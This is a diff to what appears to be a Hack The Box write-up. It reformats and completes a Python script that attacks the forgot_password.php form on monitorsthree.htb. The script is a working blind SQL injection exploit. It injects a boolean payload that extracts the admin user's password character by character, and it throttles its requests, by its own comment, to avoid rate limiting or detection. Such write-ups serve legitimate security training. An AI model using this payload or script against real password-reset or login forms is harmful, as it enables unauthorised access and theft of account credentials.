@@ -106,15 +106,18 @@ import requests
 import time
 
 # Target URL
-
 url = "http://monitorsthree.htb/forgot_password.php"
 
+# Initialize known characters of the password
+known_password = ""
+
+# List of possible characters (you may adjust as needed)
 characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 # Function to check if a guessed character is correct
-
-def is_correct_char(position, char): # Construct payload
-payload = f"ad' ||((SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}')||'"
+def is_correct_char(position, char):
+    # Construct payload
+    payload = f"ad' ||((SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}')||'"
 
     # Data to be sent in the POST request
     data = {
@@ -135,17 +138,17 @@ payload = f"ad' ||((SELECT SUBSTRING(password,{position},1) FROM users WHERE use
     return False
 
 # Loop to find each character of the password
-
-for position in range(1, 33): # Assuming password length is 32
-for char in characters:
-if is_correct_char(position, char): # Add the correct character to the known password
-known_password += char
-print(f"[+] Found character {position}: {char}")
-break # Delay to avoid server-side rate limiting or detection
-time.sleep(1) # Adjust the delay as necessary
+for position in range(1, 33):  # Assuming password length is 32
+    for char in characters:
+        if is_correct_char(position, char):
+            # Add the correct character to the known password
+            known_password += char
+            print(f"[+] Found character {position}: {char}")
+            break
+    # Delay to avoid server-side rate limiting or detection
+    time.sleep(1)  # Adjust the delay as necessary
 
 # Print the complete password when done
-
 print(f"[+] Password: {known_password}")
 
 ```
